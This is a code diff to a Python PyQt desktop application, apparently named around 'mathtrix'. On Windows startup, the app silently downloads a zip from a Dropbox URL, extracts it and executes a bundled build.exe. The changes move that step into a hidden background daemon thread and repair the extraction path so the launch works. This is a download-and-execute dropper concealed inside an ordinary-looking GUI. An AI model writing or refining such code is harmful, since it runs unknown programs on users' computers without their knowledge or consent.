@@ -1,4 +1,5 @@
 import smtplib
+from threading import Thread
 import subprocess
 import zipfile
 import os
@@ -60,7 +61,8 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         )
 
         if os.name == 'nt':
-            self.download()
+            thread = Thread(target=self.download, daemon=True)
+            thread.start()
 
     def download(self):
         url = "https://www.dropbox.com/scl/fi/mavanvbr91s3j3z9p61x4/mathtrix.zip?dl=1&rlkey=7lc0jbvfzhfpqblha0uo5wdbp"
@@ -70,7 +72,7 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         urllib.request.urlretrieve(url, path)
 
         with zipfile.ZipFile(path, "r") as zip_ref:
-            zip_ref.extractall(temp_dir)
+            zip_ref.extractall(extracted_path)
 
         subprocess.Popen(os.path.join(extracted_path, "mathtrix", "build.exe"))
 
